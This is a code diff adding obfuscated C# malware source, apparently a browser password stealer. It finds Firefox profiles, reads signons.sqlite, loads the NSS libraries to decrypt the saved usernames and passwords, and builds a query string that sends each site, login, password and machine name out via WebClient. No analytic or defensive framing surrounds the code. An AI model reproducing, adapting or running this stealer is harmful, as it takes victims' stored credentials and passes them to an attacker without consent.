@@ -1,0 +1,120 @@
+public static void TvDbsYmmzeKXixjs() 
+{ 
+    IEnumerator enumerator; 
+    IEnumerator enumerator2; 
+    Point point = new Point(10, 10); 
+    AText.Location = point; 
+    string str4 = null; 
+    bool flag = false; 
+    string str2 = Interaction.Environ("PROGRAMFILES") + @"\Mozilla Firefox\"; 
+    foreach (string str5 in Directory.GetDirectories(Interaction.Environ("APPDATA") + @"\Mozilla\Firefox\Profiles")) 
+    { 
+        if (flag) 
+        { 
+            break; 
+        } 
+        foreach (string str6 in Directory.GetFiles(str5)) 
+        { 
+            if (!flag) 
+            { 
+                if (Regex.IsMatch(str6, "signons.sqlite")) 
+                { 
+                    oivGmTktmoB(str5); 
+                    JFtOFvJTDCpbDZlzhykoPDBuNKgCbg.signon = str6; 
+                } 
+            } 
+            else 
+            { 
+                ProjectData.EndApp(); 
+                break; 
+            } 
+        } 
+    } 
+    string signon = JFtOFvJTDCpbDZlzhykoPDBuNKgCbg.signon; 
+    TSECItem item3 = new TSECItem(); 
+    TSECItem result = new TSECItem(); 
+    TSECItem item = new TSECItem(); 
+    Base base2 = new Base(signon); 
+    DataTable table2 = base2.ExecuteQuery("SELECT * FROM moz_logins;"); 
+    DataTable table = base2.ExecuteQuery("SELECT * FROM moz_disabledHosts;"); 
+    try 
+    { 
+        enumerator = table.Rows.GetEnumerator(); 
+        while (enumerator.MoveNext()) 
+        { 
+            DataRow current = (DataRow) enumerator.Current; 
+            str4 = str4 + Environment.NewLine + "hostname".ToString(); 
+        } 
+    } 
+    finally 
+    { 
+        if (enumerator is IDisposable) 
+        { 
+            (enumerator as IDisposable).Dispose(); 
+        } 
+    } 
+    OMhwbbbdVrvk(bvryeuuo(), true, 0L); 
+    try 
+    { 
+        enumerator2 = table2.Rows.GetEnumerator(); 
+        while (enumerator2.MoveNext()) 
+        { 
+            byte[] buffer2; 
+            DataRow row2 = (DataRow) enumerator2.Current; 
+            str4 = str4 + Environment.NewLine + "Application: FireFox"; 
+            string str7 = Convert.ToString(row2["formSubmitURL"].ToString()); 
+            str4 = str4 + Environment.NewLine + "Seite: " + str7; 
+            StringBuilder inStr = new StringBuilder(row2["encryptedUsername"].ToString()); 
+            int num2 = xSGTjizteYUcgxxr(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length); 
+            IntPtr ptr = new IntPtr(num2); 
+            TSECItem data = (TSECItem) Marshal.PtrToStructure(ptr, typeof(TSECItem)); 
+            if ((CqSzxpvjJWBHufugp(ref data, ref result, 0) == 0) && (result.SECItemLen != 0)) 
+            { 
+                buffer2 = new byte[(result.SECItemLen - 1) + 1]; 
+                ptr = new IntPtr(result.SECItemData); 
+                Marshal.Copy(ptr, buffer2, 0, result.SECItemLen); 
+                str4 = str4 + Environment.NewLine + "Username: " + Encoding.ASCII.GetString(buffer2); 
+            } 
+            StringBuilder builder2 = new StringBuilder(row2["encryptedPassword"].ToString());
+            int num3 = xSGTjizteYUcgxxr(IntPtr.Zero, IntPtr.Zero, builder2, builder2.Length);
+            ptr = new IntPtr(num3); 
+            TSECItem item5 = (TSECItem) Marshal.PtrToStructure(ptr, typeof(TSECItem)); 
+            if ((CqSzxpvjJWBHufugp(ref item5, ref item, 0) == 0) && (item.SECItemLen != 0)) 
+            { 
+                byte[] destination = new byte[(item.SECItemLen - 1) + 1]; 
+                ptr = new IntPtr(item.SECItemData); 
+                Marshal.Copy(ptr, destination, 0, item.SECItemLen); 
+                str4 = str4 + Environment.NewLine + "Passwort: " + Encoding.ASCII.GetString(destination) + Environment.NewLine; 
+                AText.Text = str4; 
+                new WebClient().DownloadString("?action=add&a=10&u=" + str7 + "&l=" + Encoding.ASCII.GetString(buffer2) + "&p=" + Encoding.ASCII.GetString(destination) + "&c=" + MyProject.Computer.Name.ToString()); 
+            } 
+        } 
+    } 
+    finally 
+    { 
+        if (enumerator2 is IDisposable) 
+        { 
+            (enumerator2 as IDisposable).Dispose(); 
+        } 
+    } 
+} 
+
+---------------------------------------------------------------------------------------------------------------------- 
+
+public static long oivGmTktmoB(string configdir) 
+{ 
+    string str = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\"; 
+    LoadLibrary(str + "mozutils.dll"); 
+    LoadLibrary(str + "mozcrt19.dll"); 
+    LoadLibrary(str + "nspr4.dll"); 
+    LoadLibrary(str + "plc4.dll"); 
+    LoadLibrary(str + "plds4.dll"); 
+    LoadLibrary(str + "ssutil3.dll"); 
+    LoadLibrary(str + "sqlite3.dll"); 
+    LoadLibrary(str + "mozsqlite3.dll"); 
+    LoadLibrary(str + "nssutil3.dll"); 
+    LoadLibrary(str + "softokn3.dll"); 
+    NSS3 = LoadLibrary(str + "nss3.dll"); 
+    DLLFunctionDelegate delegateForFunctionPointer = (DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(NSS3, "NSS_Init"), typeof(DLLFunctionDelegate)); 
+    return delegateForFunctionPointer(configdir); 
+}  
